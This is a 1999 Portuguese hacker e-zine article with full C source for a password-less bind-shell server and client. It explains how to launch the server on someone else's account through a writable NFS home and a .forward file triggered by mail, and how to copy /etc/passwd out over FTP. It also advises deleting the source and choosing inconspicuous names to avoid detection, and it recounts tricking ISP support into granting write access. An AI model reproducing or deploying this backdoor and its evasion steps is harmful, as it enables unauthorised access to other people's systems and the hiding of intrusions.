   ___________________________________________________________________
  |                                                                   |
  |  HackShell Client & Server (Com Códigos Fonte)                    |
  |                                                                   |
  |                                Originalmente escrito por Oluparun | 
  |             Adaptado por Davis Donovic <davisdonovic@hotmail.com> | 
  |___________________________________________________________________|


  Esse texto foi escrito  originalmente  por Oluparun na 2a edição do
  e-Zine Axur05 e foi adaptado  para uma experiência minha usando o 
  HackShell Client & Server. E deixo aqui minha  homenagem a Axur05 que
  foi a melhor no seu gênero de escrita.

  Na  maioria  dos  provedores, e  mesmo em  muitas universidades, os
  usuários não tem  acesso à shell, sendo  que  os  sysadmins  
  normalmente impedem os acessos rlogin e telnet, seja via filtragem em
  firewalls, que é  o  caso  do  meu  provedor,  colocando  logins  
  scripts  com  grampos (ex: .profile, .cshrc, etc) ou mesmo 
  desabilitando o serviço diretamente no inetd (/etc/inetd.conf).  
  Impossível abrir um shell num lugar desses? Pode  ser  que  para  os 
  irc-script-lamers que vão ao #HackerS realmente seja. Para  se  
  entrar  em  qualquer  server só são necessárias 3 coisas (anote aí):

	1) Conhecimento;
	2) Alguns neurônios funcionando;
	3) Paciência, muita paciência...

  Mesmo  nos  servers mais fechados, pelo menos os seguintes serviços
  sempre estão disponíveis:

	- WWW  (PORT 80/TCP)
	- SMTP (PORT 25/TCP) <--- LaMaHelp: isso aqui é mail
	- FTP  (PORT 20 e 21/TCP)

  Sem tornar essa discussão uma lista  de bugs/exploits (para isso vá
  no hotbot e faça search=bugtraq) o problema aqui é:

    1) Como abrir uma shell em uma conta em que você nem mesmo sabe a 
       senha;
    2) Como abrir uma shell usando  a  SUA  própria  conta caso o root 
       tenha impedido o acesso;

  Se você conseguir executar  o programa servidor  chamado  (hackshd)
  criado por Oluparun você terá acesso a uma shell SEM que seja 
  necessária senha. Vamos ver exemplos de uso para cada um dos casos:

    1) Suponha  que  você  conseguiu  montar  via NFS o diretório HOME
       de um usuário com  direito  de  gravação (export para anonymous)
       mas ao tentar usar acesso via rlogin (para isso só  seria  
       necessário criar um arquivo .rhosts contendo "+ +") você 
       descobre que  o rlogin esta desabilitado (o que é mais comum). 
       Basta você fazer o seguinte:

       a) Gravar o programa hackshd.c no diretório do usuário;

       b) Criar no HOME dir do usuário um .forward com o seguinte 
          conteúdo:

          |"cc -o hackshd hackshd.c"
          |"chmod a+x hackshd"
          |"./hackshd"

  Obs.: Use a criatividade no arquivo acima... acrescente uma linha 
        assim:
           
        |"cat /etc/passwd > ~/users-list.txt" para facilitar as coisas!
        Depois é só baixar o arquivo por FTP.

   c) Mandar um mail para  o  usuário  com  qualquer  mensagem.  Ao  
      ser recebido o mail, o programa será compilado e executado. 

   d) Daí é só você se conectar ao host usando o programa client 
      hacksh.

	hacksh vitima.com.br

   e) Caso  você  NÃO  tenha  UNIX (meus pêsames), você pode acessar 
      via TELNET usando o port 6666:

	telnet vitima.com.br 6666

      Mesmo com TELNET sendo filtrado por firewall isso funciona, pois 
      o PORT  usado  é  diferente do  TCP/23  padrão. A má noticia é
      que o telnet  entra  em  raw  mode e manda um CR/LF após cada 
      ENTER, e o UNIX  espera  apenas  um  LF. A  solução  neste caso 
      é mandar um ; (ponto-e-virgula) após cada comando, como no 
      exemplo:

	ls -sla ; 

      O comando  LS é  executado e  depois aparece uma mensagem de 
      erro, mas nem ligue para isso...


  2) Suponha que você tem conta  no servidor mas só tem  acesso  FTP  
     para fazer download/upload de arquivos. Entre com seu 
     usuário/senha  e no SEU diretório  (geralmente neste caso os 
     clientes FTP são restritos a apenas ao  próprio  home dir) crie o 
     .forward  conforme descrito anteriormente, mande um mail para você
     mesmo e ... abre-te sésamo!

  2.1) Eu já vi alguns provedores que dão acesso a um web site, onde 
       estes disponibilizam uma pasta dentro do HOMEDIR chamada 
       'public_html' default do servidor ApAChE onde você só tem 
       direito a escrever neste segundo não deixando  o  usuário
       escrever no HOMEDIR. O que fazer ? Desisitir? Não, 
       definitivamente, não! Ouçam  o que eu fiz... fui ao meu provedor
       e disse que estava  com problemas (Os técnicos de lá são muito 
       imbecis) então eu falei que  não  estava  conseguindo  fazer  o 
       upload do  meu site e que precisava  de  ajuda para  isso; Aí, 
       depois de  aulas e aulas sobre como abrir um FTP para com  o  
       provedor eu  disse que o único problema que eu estava tendo  era
       que eu não tinha permissão de escrever no meu HOMEDIR, então um 
       dos técnicos  ligou para o  seu supervisor e contou o problema,
       depois  me colocou na  linha com esse supervisor e eu contei o 
       problema, então depois  de  15min de  papo  ele  disse  para 
       mim: "Ok, resolvi seu problema, você  realmente  estava  sem  
       permissão  de  escrever  no  seu diretório, mas eu já autorizei 
       você a isso!


  OBSERVAÇÕES:

	1) NÃO SE ESQUECA de deletar o .forward ou você NUNCA mais 
          recebera um mail... 

	2) Por  questão  de  simplicidade,  o programa  apresentado não 
          usa pseudo-tty (pty) isso não  importa  desde  que  você não
          queira executar comandos fullscreen, tipo MAN. Caso você 
          tente executar um programa desse tipo, o server vai 
          pendurar...

	3) Por mais  difícil que  isso  possa parecer para alguns, NÃO 
          SEJA LAMER...  Delete o fonte  após  compilar o programa... 
          Você pode ate  incluir  uma  linha  com  um  |"rm hackshd.c"
          no .forward. Melhor  ainda,  use  um nome  menos  chamativo  
          para o server... algo tipo x, teste, ..., etc.

	4) A melhor forma de finalizar o server é mandar um comando 
          "exit". Após isso, o próximo comando  que  você  digitar  
          irá encerrar a conexao. NÃO encerre a  conexão a força (tipo 
          CTRL-C, etc) ou  o  server irá terminar com CORE e isso fica 
          na LOG do sistema...

>>> Aqui esta o servidor:

/*-----------------------------------------------------------------------*/
/*  Programa: HACKSHD.C                                                  */
/*  Função..: Servidor que permite abrir um shell sem a necessidade      */
/*            de usuário ou senha, atendendo a conexões no PORT TCP      */
/*            especificado em NUMPORT.                                   */
/*                                                                       */
/*------------------ Oluparun, ThE //\\//\\aStEr oF ||=||eLL - Fev/97  --*/
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define  NUMPORT 6666            /* Numero do PORT atendido pelo server  */
/*-----------------------------------------------------------------------*/ 

main()
{ 
   int                  insock, conec, c;
   struct sockaddr_in   cli_addr, serv_addr;

/*----- Como este pgm executa remotamente, nenhum erro e verificado  ----*/ 
   conec = accept( insock, (struct sockaddr*) &cli_addr, &c);
   insock = socket(AF_INET, SOCK_STREAM,0);
   bzero( (char *) &serv_addr, sizeof(serv_addr) );

   serv_addr.sin_family      = AF_INET;
   serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
   serv_addr.sin_port        = htons(NUMPORT);

   bind( insock, (struct sockaddr *) &serv_addr, sizeof(serv_addr) );
   listen( insock, 1 );         /* Seta socket como passivo e fila =1    */
   c = sizeof( cli_addr );    

/*----------------------- Aguarda Conexões ------------------------------*/ 
   conec = accept( insock, (struct sockaddr*) &cli_addr, &c);

dup2(conec,0);               /* redireciona a STDIN para conexão         */
   dup2(conec,1);               /* idem para a STDOUT ...                */
   dup2(conec,2);               /* e STDERR                              */
   execl("/bin/sh","sh", 0);    /* Abre-te Sésamo! :)))                  */  
}

<-------------------------------- CuT hErE -------------------------------->

Para compilar o cliente use: 

	cc -o hacksh hacksh.c

Aqui esta o código client:

/*-------------------------------------------------------------------------*/
/*  Programa...: HACKSH.C                                                  */
/*  Função.....: Cliente para acesso ao HackShell server (HACKSHD)         */
/*  Sintaxe  ..: hacksh Server_Name <Port>                                 */
/*                       Server_Name: Nome (ou IP address do Servidor)     */
/*                       Port ......: Port servidor. default= 6666         */
/*                                                                         */
/*-------------------- Oluparun, ThE //\\//\\aStEr oF ||=||eLL - Fev/97  --*/
#include <sys/types.h>
#include <sys/socket.h> 

#include <netinet/in.h>
#include <sys/socketvar.h> 
#include <sys/errno.h>
#include <netdb.h> 

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#define  PORT_SERVER  6666                /*---- Port default           ---*/
 
extern int errno;

/*-------------------------------------------------------------------------*/
/* EMULA - Emulador de terminal tty                                        */
/*-------------------------------------------------------------------------*/
void emula (conec)
     int conec;
{
  char          tecla[2], in[2];
  int           lidos = 0;

/*   fcntl(conec, F_SETFL, O_NONBLOCK); */

  switch ( fork() ) {

    case -1:                             /*--- Erro                     ---*/
      printf("\nErro no Fork");
      return;
    case 0:                              /*--- Processo FILHO           ---*/
      while (1) {
	if ( (lidos = read(conec, in, 1)) >  0 ) 
	   putchar(in[0]);
	else {
	   if (lidos == 0) 
	      return;
	   else {
	      printf("\nErro na gravação");
	      return;
	}  }
      }
    default:                             /*--- Processo PAI             ---*/
      while (1) {
	tecla[0] = getchar();
	if ( (write( conec, tecla, 1)) == -1) {
	   perror("ERRO:");
	   printf("\nErro no write");
	   return;
	}  /* if */ 
      } /* while */ 
  }  /* case */
}

/*-------------------------------------------------------------------------*/
/* MAIN - Cliente para o HackSHD                                           */
/*-------------------------------------------------------------------------*/
int main( numarg, argv)
	 int numarg;
	 char **argv;
{
   struct   hostent             *hp;
   struct   sockaddr_in         sin;
   short                        s, portnum = PORT_SERVER;
   char                         host[80];
   
   numarg--;                    /* Acho que assim fica + lógico...         */
   switch (numarg) {
     case 2:
	  portnum = atoi(argv[2]);
     case 1:
	  strcpy(host, argv[1]);
	  break;
     default:
       printf("Sintaxe: hacksh  server_name <port>\n");
       return(-1);
   }    
   

   hp = gethostbyname( host );   /*-------  Faz o GetHostByName  ----------*/
   if  ( hp == 0 ) {
     perror ( "hacksh: gethostbyname" );
     exit ( 1 );
   }
   bzero ( &sin, sizeof ( sin ) );
   bcopy ( hp->h_addr, &sin.sin_addr, hp->h_length );
   sin.sin_family = hp->h_addrtype;
   sin.sin_port = htons( portnum );

   s = socket ( AF_INET, SOCK_STREAM, 0 );

   if  ( s == -1 ) {
     perror ( "hacksh: socket" );
     exit ( 1 );
   }
/*-------------------  Conecta com o servidor     ------------------------*/
   if ( connect ( s, (struct sockaddr *) &sin, sizeof ( sin ) )  == -1 ) {
      perror ( "hacksh: connect" );
      printf ( " - erro de connect status - %d ", errno );
      exit ( 1 );
   }
   emula ( s );

/*-------------------- CLOSE ( Socket )          -------------------------*/
   close ( s );                              /* Fecha Socket e termina... */
   return(0);
}



                        < THE END AND HAV FUN >

  _____________________________________________________________________
      © Copyright 1999 - Davis Donovic (davisdonovic@hotmail.com)


  --------------------------------------------------------------------
  Virtualis nº9 -- HackShell Client & Server (Com Códigos Fonte)
